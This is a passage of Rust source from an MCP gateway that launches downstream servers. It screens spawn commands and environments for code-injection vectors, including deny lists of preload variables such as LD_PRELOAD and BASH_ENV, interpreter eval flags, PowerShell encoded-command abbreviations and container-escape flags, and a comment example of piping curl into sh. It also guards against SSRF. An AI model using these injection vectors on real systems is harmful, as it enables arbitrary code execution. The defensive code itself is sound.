    let mut assignments: Vec<(String, String)> = Vec::new();
    let mut i = 0;
    while let Some(a) = args.get(i) {
        if a.starts_with('-') {
            return Err(
                "refusing to launch 'env' with flags: set variables in the server's env \
                 field and name the program directly."
                    .to_string(),
            );
        }
        // A leading `KEY=VALUE` (key has no path separator) is an env assignment; the
        // first token that isn't one is the real command.
        match a.split_once('=') {
            Some((k, v)) if !k.is_empty() && !k.contains('/') && !k.contains('\\') => {
                assignments.push((k.to_string(), v.to_string()));
                i += 1;
            }
            _ => break,
        }
    }
    screen_spawn_env(&assignments)?;
    match args.get(i) {
        Some(cmd) => screen_spawn_command(cmd, &args[i + 1..]),
        None => Ok(()), // `env` with only assignments just sets vars; harmless.
    }
}

/// Screen the child's environment: even a benign command (`node server.js`) becomes
/// code execution if the config's env preloads code via the dynamic linker or an
/// interpreter's option/startup var. These have no legitimate use for a server
/// launcher, so refuse them (this is why we also refuse `env` as the command: the env
/// field is the ONLY way to set variables, and it's screened here).
pub fn screen_spawn_env(env: &[(String, String)]) -> Result<(), String> {
    // Always-refuse: dynamic-linker preload/audit + shell startup-file vars that run
    // code before (or instead of) the entry program. These have no benign value.
    const BLOCKED: &[&str] = &[
        "LD_PRELOAD", "LD_AUDIT", "DYLD_INSERT_LIBRARIES", "BASH_ENV", "ENV",
        // ZDOTDIR relocates zsh's startup dir, so `$ZDOTDIR/.zshenv` runs even for a
        // non-interactive `zsh script` (the zsh analog of the blocked BASH_ENV). GCONV_PATH
        // points iconv/gconv at an attacker-supplied conversion module. Neither has a
        // legitimate use on a server launcher.
        "ZDOTDIR", "GCONV_PATH",
    ];
    // Option vars that are usually benign (tuning) but can inject code via specific
    // options; only those options are refused (whole-var blocking false-positived on
    // benign values like RUBYOPT=-W0). Each entry: (VAR, dangerous option prefixes).
    // -r is ruby/node require; -e is omitted for RUBYOPT because it doesn't honor it and
    // would collide with the benign `-E<encoding>` after lowercasing.
    const OPTION_VARS: &[(&str, &[&str])] = &[
        ("NODE_OPTIONS", &["--require", "--import", "--loader", "--experimental-loader", "--eval", "-r"]),
        ("RUBYOPT", &["-r"]),
        ("JAVA_TOOL_OPTIONS", &["-javaagent", "-agentlib", "-agentpath"]),
        ("_JAVA_OPTIONS", &["-javaagent", "-agentlib", "-agentpath"]),
        // PERL5OPT applies to EVERY perl invocation (even `perl script.pl`): -M/-m
        // preload a module (running its code) and -d loads the debugger. Benign tuning
        // like -w stays allowed. Tokens are lowercased before compare, so -M -> -m.
        ("PERL5OPT", &["-m", "-d"]),
    ];
    for (k, v) in env {
        let ku = k.trim().to_ascii_uppercase();
        if BLOCKED.contains(&ku.as_str()) {
            return Err(format!(
                "refusing to launch: the environment variable '{k}' preloads or injects \
                 code into the process. Remove it from the server's env."
            ));
        }
        if let Some((_, bad)) = OPTION_VARS.iter().find(|(name, _)| *name == ku) {
            for tok in v.split_whitespace() {
                let tl = tok.to_ascii_lowercase();
                let head = tl.split('=').next().unwrap_or(&tl);
                // Prefix match so attached forms are caught in both `-r<mod>` and
                // `-javaagent:<jar>` (colon) shapes, not just an exact token.
                if bad.iter().any(|b| head == *b || head.starts_with(b)) {
                    return Err(format!(
                        "refusing to launch: {k} contains '{tok}', which preloads or \
                         evaluates code. Remove it from the server's env."
                    ));
                }
            }
        }
    }
    Ok(())
}

/// Lowercased final path segment without its extension, splitting on BOTH `/` and
/// `\` on every OS. `std::path` only treats `\` as a separator on Windows, so a
/// Windows-style path would slip this check on Linux/macOS; doing it by hand keeps
/// the guard (and its tests) platform-independent. `C:\\tools\\Node.EXE` and
/// `/usr/bin/node` both -> `node`.
fn command_basename(command: &str) -> String {
    let last = command.rsplit(['/', '\\']).next().unwrap_or(command);
    // Strip a trailing extension (`.exe`, `.js`, ...) but keep dotless names intact.
    let stem = last
        .rsplit_once('.')
        .map(|(s, _)| s)
        .filter(|s| !s.is_empty())
        .unwrap_or(last);
    stem.to_ascii_lowercase()
}

/// The first arg (returned verbatim for the error) that case-insensitively matches
/// one of `flags`, matching `-flag`, the `--flag=value` long form, AND the attached
/// short form the scripting interpreters accept where the value rides on the same
/// argv token (`python -c<code>`, `ruby -e<code>`, `perl -e<code>`, `php -r<code>`).
/// A plain equality check misses the attached form because the token is a single
/// unsplit string, letting inline eval smuggle straight past the guard — the same
/// hole `node_dangerous` already closes for `-r<module>`.
/// PowerShell runs arbitrary code via `-Command` and `-EncodedCommand` (base64), and
/// accepts any unambiguous abbreviation of a parameter name, so `-c`/`-co`/.../-command
/// and `-e`/`-en`/`-enc`/.../-encodedcommand (plus the documented `-ec` alias) all run
/// code while an exact-match list catches none of them. Match any switch whose name is
/// a prefix of `command` or `encodedcommand`; `-File`/`-NoProfile`/`-ExecutionPolicy`
/// and a bare script path stay allowed.
fn pwsh_dangerous(args: &[String]) -> Option<&str> {
    args.iter()
        .find(|a| {
            if !a.starts_with('-') && !a.starts_with('/') {
                return false;
            }
            let al = a.to_ascii_lowercase();
            let name = al.trim_start_matches(['-', '/']).split([':', '=']).next().unwrap_or("");
            !name.is_empty()
                && ("command".starts_with(name) || "encodedcommand".starts_with(name) || name == "ec")
        })
        .map(|a| a.as_str())
}

fn first_flag<'a>(args: &'a [String], flags: &[&str]) -> Option<&'a str> {
    args.iter().find(|a| {
        let al = a.to_ascii_lowercase();
        let head = al.split('=').next().unwrap_or(&al);
        if flags.contains(&head) {
            return true;
        }
        // Attached short form: `-c<code>` for a single-dash two-char flag like `-c`/`-e`.
        flags.iter().any(|f| {
            f.len() == 2 && f.starts_with('-') && al.len() > 2 && al.starts_with(f)
        })
    }).map(|a| a.as_str())
}

/// Interpreter FAMILY for dispatch: trims a trailing version so `python3.10`, `python3`,
/// and `python` all screen as `python`. Only a trailing run of ASCII digits and `.` is
/// trimmed, so non-versioned names are unchanged. Pairs with `command_basename`, which
/// already strips one extension (`python3.10.exe` -> `python3.10`).
fn interpreter_family(base: &str) -> &str {
    let trimmed = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    if trimmed.is_empty() {
        base
    } else {
        trimmed
    }
}

// Benign single-char short flags (case-sensitive) that take NO value, used by
// `clustered_eval` to know an eval flag packed AFTER them is a real inline-eval. Value-
// taking flags are deliberately OMITTED (python -m/-W/-X/-Q, ruby/perl -C/-F/-I/-K, shell
// -o) so a cluster that hands them the rest of the token isn't read as an eval.
const SHELL_BOOL: &[char] = &[
    'a', 'b', 'e', 'f', 'h', 'i', 'k', 'm', 'n', 'p', 'r', 's', 't', 'u', 'v', 'x', 'B',
    'C', 'E', 'H', 'P', 'T',
];
const PYTHON_BOOL: &[char] = &[
    'B', 'E', 'I', 'O', 'R', 'S', 'b', 'd', 'h', 'i', 'q', 's', 'u', 'v', 'x', '3',
];
const RUBY_BOOL: &[char] = &['a', 'c', 'd', 'h', 'l', 'n', 'p', 's', 'v', 'w', 'y'];
const PERL_BOOL: &[char] = &['U', 'W', 'X', 'T', 'a', 'c', 'h', 'l', 'n', 'p', 's', 'w'];

/// getopt short-flag clustering: `-ec` parses as `-e -c`, so an eval flag can ride behind
/// benign boolean flags (`sh -ec "curl|sh"`, `python -Ec "…"`, `ruby -we "…"`, `node -pe`)
/// that a plain `-c`/`-e` check misses. Walk a single-dash cluster: reaching an eval char
/// after a run of known boolean flags is a match; the first non-boolean (possibly value-
/// taking) char bails, so a value flag swallowing the rest of the token (`python -mHTTP`,
/// `bash -o pipefail`) is never mistaken for an eval. Case-sensitive so a value-taking
/// `-E`/`-W`/`-C` isn't read as a lowercase eval. `-c`/`-e` alone and `--long` forms are
/// already handled by `first_flag`.
fn clustered_eval<'a>(args: &'a [String], eval: &[char], boolean: &[char]) -> Option<&'a str> {
    for a in args {
        let s = a.as_str();
        // `--` ends the interpreter's own options; tokens after it are the script and its
        // arguments, not interpreter flags, so a cluster-shaped app arg past `--` is not a
        // real eval. (Bare operands without `--` are still scanned, matching first_flag's
        // long-standing behavior; stopping there safely would need per-interpreter value-
        // option tables, and a naive stop reintroduces bypasses via `-W x -Ec` / `-o v -ec`.)
        if s == "--" {
            break;
        }
        if !s.starts_with('-') || s.starts_with("--") || s.len() <= 2 {
            continue;
        }
        for c in s[1..].chars() {
            if eval.contains(&c) {
                return Some(s);
            }
            if !boolean.contains(&c) {
                break;
            }
        }
    }
    None
}

/// Docker/Podman args that ESCALATE beyond what a normal host process already has:
/// privileged mode, added capabilities, device passthrough, and host-namespace
/// sharing. Plain host mounts (`-v` / `--volume` / `--mount`) are intentionally NOT
/// blocked: Toolport already runs npx/uvx/binary servers with full host-filesystem
/// access, so a docker volume mount is no more dangerous than the servers we run
/// unrestricted, and blocking it would false-positive on legitimate dockerized MCP
/// servers. Namespace flags (`--pid`, `--net`, ...) trip only when their value is
/// `host`, in either `--pid=host` or `--pid host` form (so `--network mynet` is fine).
fn container_escape_flag(args: &[String]) -> Option<&str> {
    for (i, a) in args.iter().enumerate() {
        let al = a.to_ascii_lowercase();
        let head = al.split('=').next().unwrap_or(&al);
        if matches!(head, "--privileged" | "--cap-add" | "--device") {
            return Some(a.as_str());
        }
        if matches!(head, "--pid" | "--ipc" | "--uts" | "--net" | "--network" | "--userns") {
            let val = al
                .split_once('=')
                .map(|(_, v)| v.to_string())
                .or_else(|| args.get(i + 1).map(|v| v.to_ascii_lowercase()));
            if val.as_deref() == Some("host") {
                return Some(a.as_str());
            }
        }
    }
    None
}

/// Talks to a downstream MCP server over its stdio (a spawned child process).
/// Stdout is drained on a background thread into a channel so reads can time out
/// (a blocking `read_line` on an unresponsive child would otherwise hang forever).
pub struct StdioTransport {
    child: Child,
    stdin: Arc<Mutex<ChildStdin>>,
    rx: Receiver<String>,
    /// Tail of the child's stderr, drained on a background thread. A server that
    /// dies on startup (bad package name, missing API key) explains itself here,
    /// so we can report that instead of a bare "closed the connection".
    stderr: Arc<Mutex<String>>,
    next_id: i64,
    /// How long a single request waits for its response. Lowered during the
    /// connect handshake, then restored for (potentially slow) live tool calls.
    read_timeout: Duration,
    /// Gate shared with the stdout drain: the drain only flags a `dirty` signal
    /// once this is set, so tool-list changes announced during startup are
    /// ignored. Flipped on by `arm_tools_watch` after the handshake.
    armed: Arc<AtomicBool>,
    /// The command is a download-then-run launcher (npx, uvx, ...): its first
    /// `initialize` gets the long connect budget, and a connect timeout is
    /// reported as "still installing" rather than a dead server.
    launcher: bool,
    /// Answers server-initiated JSON-RPC (e.g. `roots/list`) by forwarding to the
    /// upstream MCP client. Set by the gateway before the connect handshake.
    server_handler: Option<ServerRequestHandler>,
}

/// Tolerate a config that packed the whole invocation into `command` (e.g.
/// `"npx -y @scope/pkg"`) with empty `args`. Left as-is, the OS is asked to spawn an
/// executable literally named that whole string and fails with a cryptic "cannot find
/// the path specified". Only splits when args are empty AND the first token is a bare
/// program name (no `/` or `\`), so a genuine executable path — even one with spaces —
/// and any config that already passes args separately are left untouched. The split
/// output is what gets screened and spawned, so the real inner program is still guarded.
pub fn normalize_invocation(command: &str, args: &[String]) -> (String, Vec<String>) {
    if args.is_empty() {
        let mut parts = command.split_whitespace();
        let first = parts.next().unwrap_or("");
        let rest: Vec<String> = parts.map(String::from).collect();
        if !rest.is_empty() && !first.contains('/') && !first.contains('\\') {
            return (first.to_string(), rest);
        }
    }
    (command.to_string(), args.to_vec())
}

/// True when the invocation is a download-then-run launcher: the command may have
/// to resolve and download the actual server package before it can respond (npx /
/// bunx from the npm registry, uvx / pipx from PyPI, and the package managers'
/// dlx/exec forms). Matches the executable's basename so absolute paths and
/// Windows shims (`npx.cmd`, `npx.exe`) count too.
pub fn is_download_launcher(command: &str, args: &[String]) -> bool {
    let (command, args) = normalize_invocation(command, args);
    // Split on both separators so Windows paths (e.g. `C:\...\npx.cmd`) match on
    // Linux CI and when configs store absolute shim paths cross-platform.
    let base = command
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(&command)
        .to_ascii_lowercase();
    let base = base
        .strip_suffix(".exe")
        .or_else(|| base.strip_suffix(".cmd"))
        .or_else(|| base.strip_suffix(".ps1"))
        .unwrap_or(&base);
    let first = args.first().map(String::as_str);
    match base {
        "npx" | "uvx" | "bunx" => true,
        // These only download via their run-a-package subcommand; `pnpm start`
        // and friends run what's already there.
        "pnpm" | "yarn" => first == Some("dlx"),
        "npm" => matches!(first, Some("exec") | Some("x")),
        "pipx" => first == Some("run"),
        _ => false,
    }
}

/// The connect-handshake read timeout policy for a stdio invocation: launchers
/// that may be downloading their package on first run get the long budget,
/// everything else the tight one (so a hung server still fails fast).
pub fn stdio_connect_timeout(command: &str, args: &[String]) -> Duration {
    if is_download_launcher(command, args) {
        LAUNCHER_CONNECT_TIMEOUT
    } else {
        STDIO_CONNECT_TIMEOUT
    }
}

/// Strip the gateway's own `CONDUIT_*` control-plane environment from a spawned
/// downstream server. A downstream MCP server is untrusted code, and a compromised
/// package can read its own process environment; in the file-backend and `--http`
/// bridge deployments that inherited env carries the vault master key
/// (`CONDUIT_SECRET_KEY`) or the local tool-bridge token (`CONDUIT_HTTP_TOKEN`).
/// Neither is meant for a downstream server, so remove the whole inherited
/// `CONDUIT_*` namespace (covers both, plus any future control var). A var the
/// server set for itself via its own `env` is exempt and left untouched.
fn strip_gateway_control_env(cmd: &mut Command, configured: &std::collections::HashSet<&str>) {
    for (key, _) in std::env::vars_os() {
        let Some(k) = key.to_str() else { continue };
        if k.starts_with("CONDUIT_") && !configured.contains(k) {
            cmd.env_remove(&key);
        }
    }
}

impl StdioTransport {
    /// Spawn a downstream server without watching for its tool-list changes.
    /// Used by one-shot callers (the app's health probe and playground) that
    /// don't keep the connection around to react to live notifications.
    pub fn spawn(
        command: &str,
        args: &[String],
        env: &[(String, String)],
        cwd: Option<&str>,
    ) -> Result<Self, String> {
        Self::spawn_inner(command, args, env, cwd, None)
    }

    /// Like [`spawn`], but sets a [`change`] bit in `dirty` whenever the downstream
    /// server emits a `tools` / `resources` / `prompts` `list_changed` notification
    /// (after `arm_tools_watch`). The gateway watches that flag and re-queries the
    /// affected list, so a server changing its own catalog mid-session reaches the
    /// client instead of being silently dropped.
    pub fn spawn_watched(
        command: &str,
        args: &[String],
        env: &[(String, String)],
        cwd: Option<&str>,
        dirty: Arc<AtomicU8>,
    ) -> Result<Self, String> {
        Self::spawn_inner(command, args, env, cwd, Some(dirty))
    }

    fn spawn_inner(
        command: &str,
        args: &[String],
        env: &[(String, String)],
        cwd: Option<&str>,
        dirty: Option<Arc<AtomicU8>>,
    ) -> Result<Self, String> {
        // Split a command that packed its args into the `command` string, so a
        // mis-shaped config spawns correctly instead of erroring cryptically.
        let (command_owned, args_owned) = normalize_invocation(command, args);
        let command = command_owned.as_str();
        let args = args_owned.as_slice();
        // Supply-chain guard: refuse code-smuggling / container-escape args AND
        // code-injecting env vars before we hand the command to the OS. Applies to
        // every spawn path (probe, playground, gateway) so a booby-trapped config
        // never reaches a process.
        screen_spawn_command(command, args)?;
        screen_spawn_env(env)?;
        let resolved = resolve_command(command);
        let mut cmd = Command::new(&resolved);
        cmd.args(args)
            .envs(env.iter().cloned())
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        // Never hand the gateway's own control-plane env (vault master key /
        // HTTP-bridge token) to an untrusted downstream server. Anything the server
        // configured for itself in `env` is exempt. See strip_gateway_control_env.
        let configured: std::collections::HashSet<&str> =
            env.iter().map(|(k, _)| k.as_str()).collect();
        strip_gateway_control_env(&mut cmd, &configured);
        // Optional per-server working directory (issue #239). Unset (or blank)
        // means inherit the gateway's cwd, the previous behavior. `~` and `${VAR}`
        // are expanded so a config can pin a server to a project dir. If the dir
        // doesn't exist the spawn fails with a clear error, surfaced by the probe.
        if let Some(dir) = cwd.map(str::trim).filter(|d| !d.is_empty()) {
            cmd.current_dir(expand_cwd(dir));
        }
        // Give the child the augmented PATH too, so e.g. `npx` can find `node`.
        #[cfg(not(windows))]
        cmd.env("PATH", augmented_path());
        // CREATE_NO_WINDOW: without it, every stdio server we spawn flashes a
        // console window on Windows (very visible during a probe/refresh, which
        // spawns one per server). The app and the gateway both spawn through here.
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            cmd.creation_flags(0x0800_0000);
        }
        let mut child = cmd
            .spawn()
            .map_err(|e| format!("failed to spawn '{command}': {e}"))?;
        let stdin = Arc::new(Mutex::new(child.stdin.take().ok_or("no child stdin")?));
        let stdout = child.stdout.take().ok_or("no child stdout")?;
        let stderr = child.stderr.take().ok_or("no child stderr")?;

        // Drain stdout line-by-line on a dedicated thread; the request loop pulls
        // from the channel with a timeout. The thread ends on EOF/read error or
        // when the receiver is dropped (transport closed). `forward_line` also
        // flags `dirty` when an armed server announces a tool-list change.
        let (tx, rx) = std::sync::mpsc::channel();
        let armed = Arc::new(AtomicBool::new(false));
        let drain_armed = Arc::clone(&armed);
        std::thread::spawn(move || {
            let mut reader = BufReader::new(stdout);
            loop {
                let mut line = String::new();
                // Bound each line to the same cap as an HTTP response body: a broken or
                // hostile server that emits one newline-less multi-gigabyte line can't
                // grow this String without limit (a plain `read_line` would). `take`
                // stops at the cap; a full-cap line with no terminator is a protocol
                // violation, so we close the connection.
                match (&mut reader).take(MAX_RESPONSE_BYTES).read_line(&mut line) {
                    Ok(0) => break,
                    Ok(n) => {
                        if n as u64 >= MAX_RESPONSE_BYTES && !line.ends_with('\n') {
                            eprintln!(
                                "toolport: downstream emitted an unterminated line >= {MAX_RESPONSE_BYTES} bytes; closing connection"
                            );
                            break;
                        }
                        if !forward_line(line, &tx, &dirty, &drain_armed) {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        // Drain stderr into a shared buffer, capped so a chatty server can't grow
        // it without bound. We keep the most recent output (where the fatal error
        // usually is).
        let stderr_buf = Arc::new(Mutex::new(String::new()));
        let stderr_writer = Arc::clone(&stderr_buf);
        std::thread::spawn(move || {
            let mut reader = BufReader::new(stderr);
            let mut line = String::new();
            while let Ok(n) = reader.read_line(&mut line) {
                if n == 0 {
                    break;
                }
                if let Ok(mut buf) = stderr_writer.lock() {
                    buf.push_str(&line);
                    if buf.len() > STDERR_TAIL_CAP {
                        let cut = buf.len() - STDERR_TAIL_CAP;
                        buf.drain(..cut);
                    }
                }
                line.clear();
            }
        });

        Ok(StdioTransport {
            child,
            stdin,
            rx,
            stderr: stderr_buf,
            next_id: 1,
            read_timeout: STDIO_READ_TIMEOUT,
            armed,
            launcher: is_download_launcher(command, args),
            server_handler: None,
        })
    }

    /// Build a useful error for when the child's stdout closed (it exited or
    /// crashed). Includes the exit status and the tail of stderr when available -
    /// that is where "package not found" or "missing API key" actually shows up.
    fn closed_error(&mut self) -> String {
        // The child just exited; give its stderr drain a brief moment to flush.
        std::thread::sleep(Duration::from_millis(150));
        let status = self.child.try_wait().ok().flatten();
        let tail = self
            .stderr
            .lock()
            .map(|b| b.trim().to_string())
            .unwrap_or_default();
        let mut msg = String::from("downstream server exited");
        if let Some(code) = status.and_then(|s| s.code()) {
            msg.push_str(&format!(" (status {code})"));
        }
        if tail.is_empty() {
            msg.push_str(" without output. Check the command, args, and any required API keys.");
        } else {
            msg.push_str(":\n");
            msg.push_str(&tail);
        }
        msg
    }
}

impl Transport for StdioTransport {
    fn request(&mut self, method: &str, params: Value) -> Result<Value, TransportError> {
        self.request_with_cancel(method, params, None)
    }

    fn request_with_cancel(
        &mut self,
        method: &str,
        params: Value,
        cancel: Option<CancelContext>,
    ) -> Result<Value, TransportError> {
        let id = self.next_id;
        self.next_id += 1;
        let downstream_id = json!(id);
        let msg = json!({ "jsonrpc": "2.0", "id": downstream_id.clone(), "method": method, "params": params });

        // A broken stdin pipe means the child is gone: a health failure, not a protocol error.
        let mut cancel_after_write = None;
        let cancel_guard;
        {
            let mut stdin = self.stdin.lock().map_err(|_| {
                TransportError::Unavailable("downstream stdin lock poisoned".into())
            })?;
            cancel_guard = if let Some(ctx) = cancel {
                let client_request_id = ctx.client_request_id.clone();
                let registry = ctx.registry.clone();
                let guard = registry.register(
                    client_request_id.clone(),
                    CancelEntry { stdin: Arc::clone(&self.stdin), downstream_id },
                );
                cancel_after_write = Some((registry, client_request_id));
                Some(guard)
            } else {
                None
            };
            writeln!(stdin, "{msg}").map_err(|e| TransportError::Unavailable(e.to_string()))?;
            stdin.flush().map_err(|e| TransportError::Unavailable(e.to_string()))?;
        }
        if let Some((registry, client_request_id)) = cancel_after_write {
            if registry.is_cancelled(&client_request_id) {
                registry.forward_cancel_if_ready(&client_request_id);
            }
        }
        let _cancel_guard = cancel_guard;

        // Read until the response with our id arrives, skipping notifications.
        // The deadline bounds the whole wait so an unresponsive server fails fast
        // instead of hanging the thread (and the batch probe) indefinitely.
        let deadline = Instant::now() + self.read_timeout;
        loop {
            let remaining = deadline
                .checked_duration_since(Instant::now())
                .unwrap_or_default();
            let line = match self.rx.recv_timeout(remaining) {
                Ok(l) => l,
                Err(RecvTimeoutError::Timeout) => {
                    // A launcher child that is alive but never answered `initialize`
                    // even after the long budget is almost certainly still installing
                    // its package (cold npm/PyPI cache, slow network). Say so: a bare
                    // timeout reads as a broken server when it isn't. A dead child
                    // never reaches here (its stdout closing ends the wait below).
                    let alive = self.child.try_wait().map(|s| s.is_none()).unwrap_or(false);
                    if self.launcher && alive && method == "initialize" {
                        return Err(TransportError::Unavailable(
                            "timed out waiting for 'initialize'; the launcher is likely \
                             still downloading the server package (first run on a cold \
                             cache). It usually connects on the next refresh."
                                .to_string(),
                        ));
                    }
                    return Err(TransportError::Unavailable(format!(
                        "timed out waiting for '{method}' response"
                    )));
                }
                Err(RecvTimeoutError::Disconnected) => {
                    return Err(TransportError::Unavailable(self.closed_error()))
                }
            };
            let trimmed = line.trim();
            if trimmed.is_empty() {
                continue;
            }
            let value: Value = match serde_json::from_str(trimmed) {
                Ok(v) => v,
                Err(_) => continue,
            };
            if is_server_initiated_request(&value) {
                if let Some(handler) = &self.server_handler {
                    if let Some(resp) = handler(&value) {
                        let line = serde_json::to_string(&resp)
                            .map_err(|e| TransportError::Fatal(e.to_string()))?;
                        let mut stdin = self.stdin.lock().map_err(|_| {
                            TransportError::Unavailable("downstream stdin lock poisoned".into())
                        })?;
                        writeln!(stdin, "{line}")
                            .map_err(|e| TransportError::Unavailable(e.to_string()))?;
                        stdin
                            .flush()
                            .map_err(|e| TransportError::Unavailable(e.to_string()))?;
                        continue;
                    }
                }
            }
            if ids_match(value.get("id"), Some(&json!(id))) {
                if let Some(err) = value.get("error") {
                    return Err(TransportError::Fatal(err.to_string()));
                }
                return Ok(value.get("result").cloned().unwrap_or(Value::Null));
            }
        }
    }

    fn notify(&mut self, method: &str, params: Value) -> Result<(), TransportError> {
        let msg = json!({ "jsonrpc": "2.0", "method": method, "params": params });
        let mut stdin = self
            .stdin
            .lock()
            .map_err(|_| TransportError::Fatal("downstream stdin lock poisoned".into()))?;
        writeln!(stdin, "{msg}").map_err(|e| TransportError::Fatal(e.to_string()))?;
        stdin.flush().map_err(|e| TransportError::Fatal(e.to_string()))
    }

    fn set_read_timeout(&mut self, timeout: Duration) {
        self.read_timeout = timeout;
    }

    fn connect_timeout(&self) -> Duration {
        if self.launcher {
            LAUNCHER_CONNECT_TIMEOUT
        } else {
            STDIO_CONNECT_TIMEOUT
        }
    }

    fn arm_tools_watch(&mut self) {
        self.armed.store(true, Ordering::SeqCst);
    }

    fn set_server_request_handler(&mut self, handler: ServerRequestHandler) {
        self.server_handler = Some(handler);
    }
}

impl Drop for StdioTransport {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

/// Normalize a JSON-RPC id (number or string) to a string for comparison.
fn id_key(v: &Value) -> Option<String> {
    match v {
        Value::Number(n) => Some(n.to_string()),
        Value::String(s) => Some(s.clone()),
        _ => None,
    }
}

/// Whether an SSE message's id matches the request id. Tolerant of number-vs-string
/// encoding (some servers echo a numeric id as a string). A `None` wanted id means
/// take the first message (used when we didn't send an id).
fn ids_match(got: Option<&Value>, wanted: Option<&Value>) -> bool {
    match wanted {
        None => true,
        Some(w) => match (id_key(w), got.and_then(id_key)) {
            (Some(a), Some(b)) => a == b,
            _ => false,
        },
    }
}

/// A callback that can proactively mint a fresh token before expiry or force a
/// refresh after a 401/403. `force = false` returns `Ok(None)` when the current
/// token is still fresh. A proactive error may fall back to the current token;
/// a forced error is surfaced as a per-server authentication failure.
pub type RefreshFn = Box<dyn Fn(bool) -> Result<Option<String>, String> + Send + Sync>;

/// Screen resolved socket addresses against the SSRF policy, fail-closed: returns
/// `Err` if ANY address is link-local / cloud-metadata, or - when `block_private` -
/// private / loopback / CGNAT. Refusing the whole set (not just filtering the bad
/// ones out) means a DNS answer that mixes a public and an internal IP can't sneak
/// the internal one through.
fn screen_resolved_addrs(
    addrs: &[std::net::SocketAddr],
    block_private: bool,
) -> std::io::Result<()> {
    for sa in addrs {
        let ip = sa.ip();
        if crate::oauth::ip_is_link_local(&ip) {
            return Err(std::io::Error::new(
                std::io::ErrorKind::PermissionDenied,
                format!("SSRF guard: refusing link-local / cloud-metadata address {ip}"),
            ));
        }
        if block_private && crate::oauth::ip_is_private(&ip) {
            return Err(std::io::Error::new(
                std::io::ErrorKind::PermissionDenied,
                format!("SSRF guard: refusing private / loopback address {ip}"),
            ));
        }
    }
    Ok(())
}

/// A ureq agent with the SSRF resolver installed. Because ureq resolves through this
/// resolver immediately before connecting, screening here validates the exact address
/// dialed - closing the resolve-then-connect (DNS-rebind) TOCTOU a separate pre-check
/// has. `block_private` extends the screen to internal addresses for untrusted inputs.
/// Redirects stay disabled so a credential-bearing request cannot be replayed to a
/// different host. Callers choose a timeout appropriate for their operation.
pub(crate) fn guarded_agent_with_timeout(
    block_private: bool,
    timeout: std::time::Duration,
) -> ureq::Agent {
    use std::net::{SocketAddr, ToSocketAddrs};
    ureq::AgentBuilder::new()
        .timeout(timeout)
        // Never follow redirects. MCP Streamable HTTP doesn't need cross-host
        // redirects, and following one would let a malicious server bounce us to an
        // internal address (SSRF, e.g. cloud metadata) or replay our Authorization
        // bearer to a host of its choosing (token theft).
        .redirects(0)
        .resolver(move |netloc: &str| -> std::io::Result<Vec<SocketAddr>> {
            let addrs: Vec<SocketAddr> = netloc.to_socket_addrs()?.collect();
            screen_resolved_addrs(&addrs, block_private)?;
            Ok(addrs)
        })
        .build()
}

/// The remote MCP transport allows longer-lived calls than short auxiliary HTTP
/// requests such as semantic embedding lookups.
fn guarded_agent(block_private: bool) -> ureq::Agent {
    guarded_agent_with_timeout(block_private, std::time::Duration::from_secs(30))
}

/// Talks to a remote MCP server over the Streamable HTTP transport: each request
/// is a POST, and the response is either a JSON body or an SSE stream carrying
/// the JSON-RPC message. A session id from `initialize` is echoed on later calls.
pub struct HttpTransport {
    url: String,
    agent: ureq::Agent,
    /// Separate pool so inline replies can POST while an SSE body is still open.
    inline_agent: ureq::Agent,
    session_id: Option<String>,
    next_id: i64,
    /// Raw bearer token (without the "Bearer " prefix), if the server needs auth.
    auth: Option<String>,
    /// Called before each POST to refresh a token nearing expiry, and forced once
    /// after a 401/403 to recover from an already-expired token. A proactive
    /// `None` or error keeps the current token; a forced refresh must return a new
    /// raw token or the authentication failure is surfaced.
    refresh: Option<RefreshFn>,
    server_handler: Option<ServerRequestHandler>,
}

impl HttpTransport {
    pub fn new(url: &str) -> Self {
        Self::with_auth(url, None)
    }

    pub fn with_auth(url: &str, auth: Option<String>) -> Self {
        Self::with_auth_refresh(url, auth, None)
    }

    /// Like `with_auth`, but with a callback invoked once on a 401/403 to mint a
    /// fresh token; the request is retried with whatever it returns. Blocks
    /// link-local / cloud-metadata targets but allows private/loopback (for
    /// trusted, e.g. user-added local, servers).
    pub fn with_auth_refresh(url: &str, auth: Option<String>, refresh: Option<RefreshFn>) -> Self {
        Self::guarded(url, auth, refresh, false)
    }

    /// Like `with_auth_refresh`, but when `block_private` is set the connection also
    /// refuses private/loopback/CGNAT targets (for untrusted-provenance servers).
    /// Link-local / cloud-metadata is refused regardless.
    ///
    /// This is the DNS-rebind-safe enforcement point: the SSRF policy runs INSIDE
    /// ureq's resolver, so the IP that is validated is the exact IP ureq dials. A
    /// hostname that passed a separate pre-connect guard but then rebinds to
    /// 169.254.169.254 (or, when `block_private`, an internal address) is refused at
    /// connect time - closing the resolve-then-connect TOCTOU a standalone check has.
    pub fn guarded(
        url: &str,
        auth: Option<String>,
        refresh: Option<RefreshFn>,
        block_private: bool,
    ) -> Self {
        HttpTransport {
            url: url.to_string(),
            agent: guarded_agent(block_private),
            inline_agent: guarded_agent(block_private),
            session_id: None,
            next_id: 1,
            auth,
            refresh,
            server_handler: None,
        }
    }

    /// Answer a server-initiated JSON-RPC request inline (SSE mid-stream or
    /// standalone). Returns true when the message was handled.
    fn handle_inline_server_request(&mut self, v: &Value) -> Result<bool, TransportError> {
        if !is_server_initiated_request(v) {
            return Ok(false);
        }
        let Some(handler) = &self.server_handler else {
            return Ok(false);
        };
        let Some(resp) = handler(v) else {
            return Ok(false);
        };
        self.send_post_no_response(&resp)?;
        Ok(true)
    }

    /// Try to replace a token nearing expiry. Failure here is non-fatal because
    /// the current token may remain valid throughout the safety window; a real
    /// 401/403 will force one refresh attempt below.
    fn refresh_before_send(&mut self) {
        if let Some(refresh) = &self.refresh {
            if let Ok(Some(token)) = refresh(false) {
                self.auth = Some(token);
            }
        }
    }

    fn force_refresh_after_auth_error(&mut self, code: u16) -> Result<(), TransportError> {
        match self.refresh.as_ref().expect("refresh callback checked")(true) {
            Ok(Some(token)) => {
                self.auth = Some(token);
                Ok(())
            }
            Ok(None) => Err(TransportError::Fatal(format!(
                "HTTP {code} (needs authentication): token refresh returned no token"
            ))),
            Err(e) => Err(TransportError::Fatal(format!(
                "HTTP {code} (needs authentication): token refresh failed: {e}"
            ))),
        }
    }

